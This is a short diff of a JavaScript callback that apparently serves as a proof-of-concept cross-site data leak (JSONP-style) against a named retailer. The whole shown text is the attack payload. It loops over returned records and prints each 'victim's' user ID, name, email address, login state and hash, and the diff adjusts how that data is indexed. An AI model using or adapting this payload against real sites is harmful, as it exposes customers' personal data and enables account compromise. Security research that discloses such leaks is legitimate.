@@ -1,16 +1,16 @@
 <script type="text/javascript">
 
 function myCallback(data) {
-    var len = data.bodyContent.length;
+    var len = data.length;
     alert(len);
     for (var i=0; i<len; i++) {
         document.write('Victim has data: <br>'+
-        'Kohl User ID: '+data.prospectApps[i].kohlsUserId+'<br>'+
-        'User FirstName: '+ data.prospectApps[i].firstname+'<br>'+
-        'User LastName: '+data.prospectApps[i].lastname+'<br>'+
-        'User Email Address: '+data.prospectApps[i].emailAddress+'<br>'+
-        'User Logged In: '+data.prospectApps[i].userLoggedIn+'<br>'+
-        'New Hash: '+data.prospectApps[i].newhash+'<br><br>');
+        'Kohl User ID: '+data[i].kohlsUserId+'<br>'+
+        'User FirstName: '+ data[i].firstname+'<br>'+
+        'User LastName: '+data[i].lastname+'<br>'+
+        'User Email Address: '+data[i].emailAddress+'<br>'+
+        'User Logged In: '+data[i].userLoggedIn+'<br>'+
+        'New Hash: '+data[i].newhash+'<br><br>');
     }
 }
 </script>
